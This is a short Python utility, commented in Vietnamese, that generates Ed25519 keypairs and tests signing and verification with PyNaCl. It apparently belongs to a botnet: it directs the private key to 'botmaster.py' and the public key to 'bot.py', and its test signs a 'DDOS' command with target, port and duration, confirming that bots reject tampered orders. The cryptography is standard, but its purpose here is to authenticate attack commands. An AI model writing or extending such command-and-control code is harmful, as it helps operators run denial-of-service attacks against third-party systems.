#!/usr/bin/env python3
"""
Crypto Utilities - Dùng khi dev
  python3 crypto_utils.py generate    → Sinh keypair mới
  python3 crypto_utils.py test        → Test sign + verify
"""

import json
import base64
import sys

try:
    from nacl.signing import SigningKey, VerifyKey
    from nacl.exceptions import BadSignature
except ImportError:
    print("Cần cài: pip install pynacl")
    sys.exit(1)


def generate():
    sk = SigningKey.generate()
    vk = sk.verify_key
    print("=== ED25519 KEYPAIR ===\n")
    print(f"PRIVATE_KEY = \"{sk.encode().hex()}\"")
    print(f"PUBLIC_KEY  = \"{vk.encode().hex()}\"\n")
    print("Copy PRIVATE → botmaster.py")
    print("Copy PUBLIC  → bot.py")


def test():
    print("=== SIGN/VERIFY TEST ===\n")
    sk = SigningKey.generate()
    vk = sk.verify_key

    cmd = {"type": "DDOS", "target": "1.2.3.4", "port": "80", "duration": "30"}
    msg = json.dumps(cmd, sort_keys=True).encode()
    signed = sk.sign(msg)
    cmd["signature"] = base64.b64encode(signed.signature).decode()

    # Verify
    sig = base64.b64decode(cmd["signature"])
    body = {k: v for k, v in cmd.items() if k != "signature"}
    message = json.dumps(body, sort_keys=True).encode()

    try:
        vk.verify(message, sig)
        print("✅ Signature VALID")
    except BadSignature:
        print("❌ Signature INVALID")

    # Tamper test
    body["target"] = "9.9.9.9"
    tampered = json.dumps(body, sort_keys=True).encode()
    try:
        vk.verify(tampered, sig)
        print("❌ Tampered should fail!")
    except BadSignature:
        print("✅ Tampered correctly rejected")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 crypto_utils.py [generate|test]")
    elif sys.argv[1] == "generate":
        generate()
    elif sys.argv[1] == "test":
        test()
    else:
        print(f"Unknown command: {sys.argv[1]}")
